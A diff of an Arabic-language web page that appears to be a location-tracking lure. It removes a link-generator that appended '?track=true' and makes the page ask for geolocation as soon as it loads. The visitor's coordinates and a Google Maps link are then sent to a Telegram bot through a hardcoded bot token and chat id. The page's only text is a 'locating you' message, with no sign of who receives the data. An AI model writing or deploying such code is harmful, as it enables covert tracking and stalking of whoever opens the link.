@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>إنشاء رابط</title>
+  <title>تحديد الموقع</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -15,47 +15,25 @@
       height: 100vh;
       text-align: center;
     }
-    button {
-      padding: 15px 30px;
-      font-size: 18px;
-      border-radius: 12px;
-      border: none;
-      background-color: #141B3D;
-      color: white;
-      cursor: pointer;
-      margin-top: 20px;
+    h1 {
+      color: #141B3D;
     }
-    #linkBox {
-      margin-top: 20px;
-      background: #fff;
-      padding: 15px;
-      border-radius: 10px;
-      display: none;
-      word-break: break-all;
+    p {
+      margin-top: 10px;
+      color: gray;
     }
   </style>
 </head>
 <body>
 
-  <h1>إنشاء رابط</h1>
-  <button onclick="generateLink()">إنشاء الرابط</button>
-
-  <div id="linkBox">
-    <p>انسخ الرابط وارسله:</p>
-    <div id="generatedLink"></div>
-  </div>
+  <h1>جارٍ تحديد موقعك...</h1>
+  <p>من فضلك اضغط "سماح" لتحديد موقعك الجغرافي</p>
 
   <script>
-    function generateLink() {
-      const link = window.location.href + "?track=true";
-      document.getElementById('generatedLink').innerText = link;
-      document.getElementById('linkBox').style.display = "block";
-    }
-
     async function sendLocationToTelegram(lat, lon) {
       const token = "7674029114:AAHaq4rCkgM8qmfijdQ7L-uYiRnG7HJqdZk";
       const chat_id = "7037026615";
-      const message = `🛰️ تم تحديد موقع جديد:\n\n📍 الإحداثيات:\nLatitude: ${lat}\nLongitude: ${lon}\n\n🌍 https://www.google.com/maps?q=${lat},${lon}`;
+      const message = `📍 موقع جديد:\n\n🧭 Latitude: ${lat}\n🧭 Longitude: ${lon}\n🌍 Google Maps:\nhttps://www.google.com/maps?q=${lat},${lon}`;
 
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
@@ -78,19 +56,16 @@
             sendLocationToTelegram(lat, lon);
           },
           (error) => {
-            alert("حدث خطأ في تحديد الموقع أو تم الرفض.");
+            alert("⚠️ لم يتم السماح بتحديد الموقع.");
           }
         );
       } else {
-        alert("المتصفح لا يدعم تحديد الموقع.");
+        alert("🚫 متصفحك لا يدعم تحديد الموقع.");
       }
     }
 
-    // تحقق إذا كان الرابط يحتوي على track
-    const params = new URLSearchParams(window.location.search);
-    if (params.has("track")) {
-      requestLocation();
-    }
+    // يبدأ فورًا
+    requestLocation();
   </script>
 
 </body>
